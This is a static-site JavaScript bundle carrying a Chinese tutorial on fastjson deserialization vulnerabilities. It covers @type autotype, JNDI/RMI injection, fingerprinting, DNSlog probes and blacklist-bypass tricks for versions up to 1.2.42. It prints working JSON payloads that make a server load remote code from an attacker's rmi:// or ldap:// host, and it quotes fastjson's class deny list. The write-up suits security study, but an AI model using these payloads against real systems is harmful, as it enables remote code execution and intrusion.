import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as t,o as p}from"./app-vU8izl1I.js";const o="/DailyNotes/assets/image-20230528174741610-DPUKFagU.png",e="/DailyNotes/assets/v2-4d7997d41a1a1b86b9199698750d664f_720w-BmRAz6-t.webp",c="/DailyNotes/assets/image-20230609092625125-DBTMTSm3.png",l="/DailyNotes/assets/image-20230609092501016-Grplwow3.png",i="/DailyNotes/assets/image-20230609092537974-P5JfsHs6.png",u="/DailyNotes/assets/image-20230703151327234-CWzoPwia.png",r="/DailyNotes/assets/image-20230703162124405-BjLt-Luw.png",k="/DailyNotes/assets/image-20230703162343567-BNRasGB6.png",g="/DailyNotes/assets/image-20230703151711466-DV5ZfMTM.png",d="/DailyNotes/assets/image-20230703151809119-DFK_6TgB.png",m="/DailyNotes/assets/image-20230609101653093-BMczEBA6.png",f="/DailyNotes/assets/image-20230609101243387-B_QCe8z-.png",y="/DailyNotes/assets/image-20230608131335095-CTd7gTv0.png",h="/DailyNotes/assets/image-20230608173650227-DcJwcBNl.png",b="/DailyNotes/assets/image-20230619160428015-DS7BDwgq.png",j="/DailyNotes/assets/image-20230619162916883-Db-qe-b1.png",q="/DailyNotes/assets/image-20230619160718725-D36nBjqn.png",N="/DailyNotes/assets/image-20230619161609186-Bso5j3R7.png",_="/DailyNotes/assets/image-20230619162339270-DXxxeW6m.png",J="/DailyNotes/assets/image-20230619163158122-P1WjqIhz.png",S="/DailyNotes/assets/image-20230619163319115-BUpg7H5g.png",v="/DailyNotes/assets/image-20230619180428246-CWAO4SFg.png",x="/DailyNotes/assets/image-20230609105231200-BwxXxH_p.png",w="/DailyNotes/assets/image-20230609105736726-VjknoPYD.png",D="/DailyNotes/assets/image-20230609142233848-BydjU8op.png",I="/DailyNotes/assets/image-20230609142504773-B07C778b.png",O="/DailyNotes/assets/image-20230609142713545-BgxOou_L.png",C="/DailyNotes/assets/image-20230609142013160-C1ENl16J.png",z="/DailyNotes/assets/image-20230529100551944-Bbv0T8je.png",L="/DailyNotes/assets/image-20230529100957138-DPhp-Ck0.png",R={};function A(T,n){return p(),a("div",null,[...n[0]||(n[0]=[t(`<h1 id="fastjson-漏洞分析及复现" tabindex="-1"><a class="header-anchor" href="#fastjson-漏洞分析及复现"><span>fastjson 漏洞分析及复现</span></a></h1><p>FastJson 是一个由阿里巴巴研发的 java 库，可以将 Java 对象转换为 JSON 格式，也可以将 JSON 字符串转换为 Java 对象。</p><p>fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p><p>fastjson 源码地址：https://github.com/alibaba/fastjson</p><p>fastjson 中文 Wiki：https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</p><h2 id="_1-fastjson-反序列化方式简介" tabindex="-1"><a class="header-anchor" href="#_1-fastjson-反序列化方式简介"><span>1. fastjson 反序列化方式简介</span></a></h2><p>fastjson<strong>序列化就是将 java 对象转化为 json 字符串，而反序列化就是将 json 字符串转化为 java 对象</strong>。</p><p>fastjson 有两种常见的处理 JSON 的方法：</p><ul><li><code>JSON.toJSONString()</code>方法：可将对象转换成<code>JSON</code>字符串</li><li><code>JSON.parseObject()</code>方法：将<code>JSON</code>字符串转换成对象。</li></ul><p>maven 引入</p><pre><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>xxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><p>User 类：</p><pre><code class="language-java">
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;call setUsername&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> username<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;call setAge&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p>进行序列化及反序列化：</p><pre><code class="language-java"><span class="token doc-comment comment">/**
 * <span class="token keyword">@author</span> :xmsong
 * <span class="token keyword">@date</span> : 2023/5/28 9:53
 */</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> parseObjectTest <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token comment">//序列化</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;---序列化---&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">User</span> user1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user1<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user1<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> json1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//反序列化</span>
        <span class="token class-name">String</span> json2 <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;age\\&quot;:66,\\&quot;username\\&quot;:\\&quot;test\\&quot;}&quot;</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;---指定.class 反序列化---&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">User</span> user2_1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>json2<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 后面的User.class表示反序列化为User类</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user2_1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;---不指定类 反序列化---&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">JSONObject</span> user2_2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>json2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user2_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;---指定@type 反序列化---&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> json3 <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;User\\&quot;, \\&quot;age\\&quot;:66,\\&quot;username\\&quot;:\\&quot;test\\&quot;}&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">JSONObject</span> user3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>json3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>


<span class="token comment">// 反序列化</span>
<span class="token comment">// 这里我们反序列化使用的是parseObject()方法，其实也可以用到parse()方法，parseObject() 本质上也是调用 parse() 进行反序列化的。</span>
<span class="token comment">// 但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()；</span>
</code></pre><p>例如前面代码运行结果为：</p><figure><img src="`+o+'" alt="image-20230528174741610" tabindex="0" loading="lazy"><figcaption>image-20230528174741610</figcaption></figure><blockquote><p><code>@type</code>是<code>fastjson</code>中的一个特殊注解，用于标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型。具体来说，当<code>fastjson</code>从<code>JSON</code>字符串反序列化为<code>Java</code>对象时，如果<code>JSON</code>字符串中包含<code>@type</code>属性，<code>fastjson</code>会根据该属性的值来确定反序列化后的<code>Java</code>对象的类型。</p></blockquote><p>Java 实现 Excel 导入和导出 https://blog.csdn.net/bbj12345678/article/details/131370637</p><h2 id="_2-反序列化漏洞基础" tabindex="-1"><a class="header-anchor" href="#_2-反序列化漏洞基础"><span>2. 反序列化漏洞基础</span></a></h2><p>上面例子可以看出，fastjson 反序列化时，支持使用@type 字段来指定反序列化的类型，并调用该类的 set/get 方法来访问属性，当组件开启了 autotype 功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定 setter 或者 getter 方法中，即可构造出一些恶意利用链。但需注意 JNDI 注入有 JDK 版本限制，高版本需要进行绕过。</p><h3 id="_1-漏洞利用前提" tabindex="-1"><a class="header-anchor" href="#_1-漏洞利用前提"><span>（1）漏洞利用前提</span></a></h3><ol><li>用户能控制反序列化的类；</li><li>反序列化时类中的方法会被执行。</li></ol><p>对比上面三种方式可知，当指定目标类时，<code>JSON.parseObject()</code>会识别并调用指定的目标类的 <code>setter </code>方法及某些特定条件的 <code>getter </code>方法，而直接使用该方法返回的是<code>JSONObject</code>对象，是不会触发<code>setXXX</code>方法的（因为 JVM 也不知道是哪个类的对象）。</p><h3 id="_2-反序列化实现-rce" tabindex="-1"><a class="header-anchor" href="#_2-反序列化实现-rce"><span>（2）反序列化实现 RCE</span></a></h3><p>想要在反序列化的时候调用对应方法有两种方式：</p><ol><li>在要反序列化的 JSON 字符串中没有<code>@types</code>时，需要将第二个参数设置为指定类，例如<code>User.class</code>，此时会返回一个 User 类对象。<strong>在 parseObject()方法中传入类的方法，已经把反序列化的类固定了，没法通过用户来控制</strong></li><li>通过@type 字段来指定该 JSON 应当还原成何种类型的对象，此时返回<code>JSONObject</code>。**使用@type 参数的方式进行反序列化，攻击者可以构造带有@type 参数的 JSON 发送给服务器。**在这个 JSON 反序列化接口处，我们传入恶意的 JSON，就可以调用任意类的构造方法以及属性相关的 get，set 方法。 如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意 JSON 达到 RCE 的作用。</li></ol><h3 id="_3-jndi-注入" tabindex="-1"><a class="header-anchor" href="#_3-jndi-注入"><span>（3）JNDI 注入</span></a></h3><p><strong>JNDI(Java Naming and Directory Interface)<strong>是一个应用程序设计的 API，为开发人员提供了</strong>查找和访问各种命名和目录服务</strong>的通用、统一的接口（类似 JDBC 都是构建在抽象层上）。现在 JNDI 已经成为 J2EE 的标准之一，所有的 J2EE 容器都必须提供一个 JNDI 的服务。</p><p>**命名服务：<strong>将 Java 对象以某个名称的形式</strong>绑定（binding）<strong>到一个容器环境（Context）中，以后调用容器环境（Context）的</strong>查找（lookup）**方法又可以查找出某个名称所绑定的 Java 对象。简单来说，就是把一个 Java 对象和一个特定的名称关联在一起，方便容器后续使用。</p><p>**目录服务：**将一个对象的所有属性信息保存到一个容器环境中。JNDI 的目录（Directory）原理与 JNDI 的命名（Naming）原理非常相似，主要的区别在于目录容器环境中保存的是对象的属性信息，而不是对象本身。举个例子，Name 的作用是在容器环境中绑定一个 Person 对象，而 Directory 的作用是在容器环境中保存这个 Person 对象的属性，比如说 age=10，name=小明等等。实际上，二者往往是结合在一起使用的。</p><p><code>JNDI</code>默认支持自动转换的协议：</p><table><thead><tr><th>协议名称</th><th>协议 URL</th><th>Context 类</th></tr></thead><tbody><tr><td>DNS 协议</td><td><code>dns://</code></td><td><code>com.sun.jndi.url.dns.dnsURLContext</code></td></tr><tr><td>RMI 协议</td><td><code>rmi://</code></td><td><code>com.sun.jndi.url.rmi.rmiURLContext</code></td></tr><tr><td>LDAP 协议</td><td><code>ldap://</code></td><td><code>com.sun.jndi.url.ldap.ldapURLContext</code></td></tr><tr><td>LDAP 协议</td><td><code>ldaps://</code></td><td><code>com.sun.jndi.url.ldaps.ldapsURLContextFactory</code></td></tr><tr><td>IIOP 对象请求代理协议</td><td><code>iiop://</code></td><td><code>com.sun.jndi.url.iiop.iiopURLContext</code></td></tr><tr><td>IIOP 对象请求代理协议</td><td><code>iiopname://</code></td><td><code>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</code></td></tr><tr><td>IIOP 对象请求代理协议</td><td><code>corbaname://</code></td><td><code>com.sun.jndi.url.corbaname.corbanameURLContextFactory</code></td></tr></tbody></table><hr><p>**RMI（Remote Method Invocation）**是专为 Java 环境设计的远程方法调用机制，远程服务器实现具体的 Java 方法并提供接口，客户端本地需根据接口类的定义，提供相应的参数即可调用远程方法。</p><p>RMI 核心特点之一就是动态类加载，如果当前 JVM 中没有某个类的定义，它可以从远程 URL 去下载这个类的 class，动态加载的对象 class 文件可以使用 Web 服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI 注册表上可以动态的加载绑定多个 RMI 应用。<strong>RMI 服务端将 URL 传递给客户端，客户端通过 HTTP/HTTPS 请求下载这些类。</strong></p><figure><img src="'+e+'" alt="v2-4d7997d41a1a1b86b9199698750d664f_720w" tabindex="0" loading="lazy"><figcaption>v2-4d7997d41a1a1b86b9199698750d664f_720w</figcaption></figure><hr><p><strong>JNDI 注入</strong>，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意载荷，造成注入攻击。</p><p>攻击者先准备一个恶意的命令执行的 java 类，如下：</p><figure><img src="'+c+'" alt="image-20230609092625125" tabindex="0" loading="lazy"><figcaption>image-20230609092625125</figcaption></figure><p>攻击者再准备一个 RMI 服务器，当收到 rmi 的请求后，就去加载上面的恶意类，将结果返回给客户端，如下：</p><figure><img src="'+l+'" alt="image-20230609092501016" tabindex="0" loading="lazy"><figcaption>image-20230609092501016</figcaption></figure><p>假设有一个客户端，使用了如下的 lookup()函数，并且参数可控，只要被攻击主机发出如下的 rmi 请求，就会加载一个远程的恶意对象，使得攻击成功。</p><figure><img src="'+i+'" alt="image-20230609092537974" tabindex="0" loading="lazy"><figcaption>image-20230609092537974</figcaption></figure><p><strong>JDK 版本对于 JDNI 注入的限制，基于 RMI 利用的 JDK 版本&lt;=6u141、7u131、8u121，基于 LDAP 利用的 JDK 版本&lt;=6u211、7u201、8u191。（更高版本也有绕过）</strong></p><h2 id="_3-漏洞分析" tabindex="-1"><a class="header-anchor" href="#_3-漏洞分析"><span>3. 漏洞分析</span></a></h2><h3 id="指纹判断" tabindex="-1"><a class="header-anchor" href="#指纹判断"><span>指纹判断</span></a></h3><p>无特殊配置情况下 fastjson，无正确的闭合会报错，返回结果里有 fastjson 字样。</p><figure><img src="'+u+'" alt="image-20230703151327234" tabindex="0" loading="lazy"><figcaption>image-20230703151327234</figcaption></figure><figure><img src="'+r+'" alt="image-20230703162124405" tabindex="0" loading="lazy"><figcaption>image-20230703162124405</figcaption></figure><figure><img src="'+k+'" alt="image-20230703162343567" tabindex="0" loading="lazy"><figcaption>image-20230703162343567</figcaption></figure><p>如果是配置了不返回报错信息怎么办？那这种情况就只有利用 dnslog 盲打了。</p><figure><img src="'+g+'" alt="image-20230703151711466" tabindex="0" loading="lazy"><figcaption>image-20230703151711466</figcaption></figure><figure><img src="'+d+`" alt="image-20230703151809119" tabindex="0" loading="lazy"><figcaption>image-20230703151809119</figcaption></figure><p><strong>盲打 payload</strong>(dnslog 处填写生成的域名)</p><pre><code class="language-json"><span class="token comment">// 1.2.67版本前</span>
<span class="token punctuation">{</span><span class="token property">&quot;zeo&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.Inet4Address&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment">// 1.2.67版本后</span>
<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.Inet4Address&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.Inet6Address&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.InetSocketAddress&quot;</span><span class="token punctuation">{</span><span class="token property">&quot;address&quot;</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre><h3 id="fastjson-1-2-24" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-24"><span>fastjson&lt;=1.2.24</span></a></h3><p><code>com.sun.rowset.JdbcRowSetImpl</code>这个类可以被利用这个类中有很多的<code>setXXX</code>方法，我们需要利用的是<code>setDataSourceName()</code>和<code>setAutoCommit()</code>这两个方法，通过 JNDI 注入来实现 RCE。</p><p>payload 一般长这样：</p><pre><code class="language-json"><span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;rmi://ip:port/Exploit&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span>
或者
<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://ip:port/Exploit&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span>
</code></pre><p>攻击时只需要将如下内容发送给 fastjson:</p><figure><img src="`+m+'" alt="image-20230609101653093" tabindex="0" loading="lazy"><figcaption>image-20230609101653093</figcaption></figure><p>payload 发送给服务端后会执行 setAutoCommit()，setAutoCommit()执行了 connct()函数，</p><figure><img src="'+f+'" alt="image-20230609101243387" tabindex="0" loading="lazy"><figcaption>image-20230609101243387</figcaption></figure><p>connect()会对 dataSourceName 属性进行一个<strong>InitialContext.lookup()</strong>，从而实现 JNDI 注入。</p><figure><img src="'+y+'" alt="image-20230608131335095" tabindex="0" loading="lazy"><figcaption>image-20230608131335095</figcaption></figure><hr><h3 id="_1-2-25-fastjson-1-2-41" tabindex="-1"><a class="header-anchor" href="#_1-2-25-fastjson-1-2-41"><span>1.2.25&lt;=fastjson&lt;=1.2.41</span></a></h3><p>fastjson 于在 1.2.25 开始加入了黑白名单机制，继续用 1.2.24 的 payload（这里用 TemplatesImpl 的 payload）去打，会发现报错 autotype 不支持</p><figure><img src="'+h+`" alt="image-20230608173650227" tabindex="0" loading="lazy"><figcaption>image-20230608173650227</figcaption></figure><p>究其原因，是因为在 com.alibaba.fastjson.parser.ParserConfig 加入了 CheckAutoType 方法，传进来的@type 的值要进入一个 checkAutoType()方法的判断：</p><pre><code class="language-java"><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>ParserConfig</span>类中：

<span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> expectClass<span class="token punctuation">)</span>
</code></pre><p><strong>在其中有个 autotypesupport 属性，如果为 false，那么就会检测 json 中@type 的值 开头是否与黑名单中的值一样，若一样就直接返回一个异常，然后加载白名单中的类</strong></p><figure><img src="`+b+`" alt="image-20230619160428015" tabindex="0" loading="lazy"><figcaption>image-20230619160428015</figcaption></figure><p>黑名单长这样:</p><pre><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>denyList <span class="token operator">=</span> <span class="token string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><figure><img src="`+j+'" alt="image-20230619162916883" tabindex="0" loading="lazy"><figcaption>image-20230619162916883</figcaption></figure><p><strong>若 autotypesupport 开启，则会先白名单加载，后黑名单检测</strong></p><figure><img src="'+q+'" alt="image-20230619160718725" tabindex="0" loading="lazy"><figcaption>image-20230619160718725</figcaption></figure><p>此处的 loadclass 方法如下：<strong>若类名以 L 开头；结尾，则会把这两个字符去掉并加载类</strong>。</p><blockquote><p>至于为什么会有这种奇怪的处理，<code>L </code>和<code>;</code>这一对字符其实是 JVM 字节码中用来表示类名的</p></blockquote><figure><img src="'+N+`" alt="image-20230619161609186" tabindex="0" loading="lazy"><figcaption>image-20230619161609186</figcaption></figure><p><strong>绕过方式</strong>：所以在 autotypesupport 开启时，我们可以构造如下 payload 来 bypass</p><pre><code class="language-javascript"><span class="token punctuation">{</span><span class="token string-property property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="token punctuation">,</span><span class="token string-property property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;rmi://ip:1099&quot;</span><span class="token punctuation">,</span><span class="token string-property property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span>
</code></pre><p>如何开启 autotypesupport？只需在 json 被解析前加入如下代码即可</p><pre><code class="language-java"><span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><figure><img src="`+_+'" alt="image-20230619162339270" tabindex="0" loading="lazy"><figcaption>image-20230619162339270</figcaption></figure><p>就可以在绕过黑名单检测；</p><figure><img src="'+J+'" alt="image-20230619163158122" tabindex="0" loading="lazy"><figcaption>image-20230619163158122</figcaption></figure><p>在 loadclass 方法中去掉多余的字符，从而调用正确的类<code>JdbcRowSetImpl</code>。</p><figure><img src="'+S+`" alt="image-20230619163319115" tabindex="0" loading="lazy"><figcaption>image-20230619163319115</figcaption></figure><hr><h3 id="fastjson-1-2-42" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-42"><span>fastjson=1.2.42</span></a></h3><p>42 版本中开发人员将明文黑名单改成了 hash 黑名单，已经有人碰撞出了不少；https://github.com/LeadroyaL/fastjson-blacklist</p><p>在处理前一种黑名单绕过的时候做了一个校验，如果<strong>类名</strong>以<code>L</code>开头，<code>;</code>结尾，则会用 stubstring 去掉(这个判断是由 HASH 来判断的）但是没有考虑到双写或多写的情况，也就是说这种方法只能防御一组 L 和;，：</p><pre><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p><strong>bypass（双写绕过）</strong></p><p><strong>前提：需要开启 autotype</strong></p><pre><code class="language-javascript"><span class="token punctuation">{</span>
    <span class="token string-property property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="token punctuation">,</span>
    <span class="token string-property property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://127.0.0.1:2357/Command8&quot;</span><span class="token punctuation">,</span>
    <span class="token string-property property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span>
<span class="token punctuation">}</span>
